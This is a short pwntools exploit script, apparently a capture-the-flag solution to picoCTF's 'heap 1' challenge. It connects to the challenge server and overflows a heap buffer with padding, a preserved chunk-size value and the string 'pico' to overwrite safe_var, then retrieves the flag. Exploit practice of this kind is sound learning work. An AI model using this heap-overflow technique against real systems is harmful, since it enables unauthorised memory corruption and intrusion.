# picoCTF-heap-1-exploit.py
# by Aidan Wech (ahwech)
# nc tethys.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "tethys.picoctf.net"
    port = 64423

    # variables
    # payload overflows to safe_var on heap, keeps size the same
    offset_to_heap_chunk_size = 24
    heap_chunk_size_str = "\x24" + "\0" * 7
    payload = flat(
        {offset_to_heap_chunk_size: heap_chunk_size_str},
        "pico"
    )

    p = remote(host, port)

    # write payload to buffer
    p.recvuntil(b"choice: ", timeout=1)
    p.sendline(b"2")
    p.recvuntil(b"buffer: ", timeout=1)
    p.sendline(payload)

    # print flag
    p.recvuntil(b"choice: ", timeout=1)
    p.sendline(b"4")
    p.recvuntil(b"WIN\n", timeout=1)
    flag = p.recvline(timeout=1).decode("utf-8").rstrip("\n")
    p.close()
    
    # reveal flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()